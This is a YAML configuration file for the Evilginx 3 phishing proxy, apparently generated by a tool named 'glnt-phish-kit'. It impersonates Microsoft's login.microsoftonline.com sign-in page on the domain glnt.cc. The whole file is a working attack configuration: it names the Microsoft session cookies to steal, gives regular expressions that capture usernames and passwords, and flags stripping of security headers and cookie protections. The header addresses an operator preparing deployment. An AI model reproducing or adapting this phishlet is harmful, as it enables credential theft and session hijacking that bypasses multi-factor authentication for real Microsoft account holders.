# =============================================================================
# Evilginx 3 Phishlet — converted from microsoft.json
# =============================================================================
#
# IMPORTANT: This is an automated conversion. Operator MUST review before use.
#
# Session cookies (Evilginx auto-detects these; listed for operator reference):
#   - ESTSAUTH
#   - ESTSAUTHPERSISTENT
#   - ESTSAUTHLIGHT
#   - SignInStateCookie
#
# JSON rewrite flags active: strip_csp, strip_xfo, strip_hsts, strip_cookie_secure, strip_cookie_domain, rewrite_location
# Evilginx auto_filter handles some of these; verify after deployment.
#

name: microsoft
author: "glnt-phish-kit"
min_ver: "3.0.0"
proxy_hosts:
  - phish_sub: login
    orig_sub: login
    domain: microsoftonline.com
    session: true
    is_landing: true
    auto_filter: true
sub_filters:
  - hostname: login.glnt.cc
    sub: login
    domain: glnt.cc
    replace:
      from: login.glnt.cc
      to: login.microsoftonline.com
auth_urls:
  - https://login.microsoftonline.com/
  - https://login.microsoftonline.com/common/
  - https://login.microsoftonline.com/organizations/
  - https://login.microsoftonline.com/consumers/
  - https://login.microsoftonline.com/kmsi
  - https://login.microsoftonline.com/login
  - https://login.microsoftonline.com/SAS/
  - https://login.microsoftonline.com/federation/
landing_path: "/"
user_re: "(?:loginfmt|login|email|username)=([^&]+)"
pass_re: "(?:passwd|password|Password|secret)=([^&]+)"
force_post: false
is_mfa: false
